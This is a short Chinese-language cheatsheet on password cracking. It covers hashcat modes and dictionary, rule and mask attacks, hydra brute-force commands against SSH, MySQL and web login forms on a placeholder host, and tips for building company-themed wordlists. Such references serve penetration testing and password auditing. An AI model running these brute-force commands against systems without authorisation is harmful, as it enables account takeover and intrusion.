# Hashcat & 密码攻击 Cheatsheet

## hashcat 常用模式（-m）

| 模式 | 哈希类型 |
|---|---|
| 0 | MD5 |
| 100 | SHA1 |
| 1400 | SHA256 |
| 1800 | sha512crypt ($6$) |
| 1000 | NTLM（Windows） |
| 300 | MySQL5 |
| 3200 | bcrypt |
| 22000 | WPA-PBKDF2（WiFi） |

## 常用攻击方式（-a）

```bash
# 字典攻击
hashcat -m 0 hash.txt rockyou.txt
# 字典+规则 (best64 是常用规则集)
hashcat -m 0 hash.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule
# 掩码攻击: 8位纯数字
hashcat -m 0 hash.txt -a 3 ?d?d?d?d?d?d?d?d
# 组合: 字典A+字典B 拼接
hashcat -m 0 hash.txt -a 1 dict1.txt dict2.txt
```

掩码字符集：`?d` 数字 `?l` 小写 `?u` 大写 `?s` 特殊 `?a` 全部

## 实用技巧

- `--show` 查看已破解的；`--username` 忽略用户名字段
- GPU 温度：`--hwmon-temp-abort=80` 防过热
- 破解过的先跑 `rockyou` + `best64.rule`，命中率已经很高
- bcrypt 慢 1000 倍，先确认值得
- 在线库（cmd5 之类）先查一遍，省算力

## 在线爆破（hydra）

```bash
hydra -l admin -P pass.txt target.com ssh
hydra -L users.txt -P pass.txt target.com mysql
hydra -l admin -P pass.txt target.com http-post-form "/login:user=^USER^&pass=^PASS^:F=failed"
```

`http-post-form` 格式：`路径:参数:失败特征`，`^USER^/^PASS^` 是占位符。

## 字典

- [SecLists](https://github.com/danielmiessler/SecLists)：Passwords/ 下常用
- 自造字典：公司名+年份+`@123` 这类规则社工字典往往更快
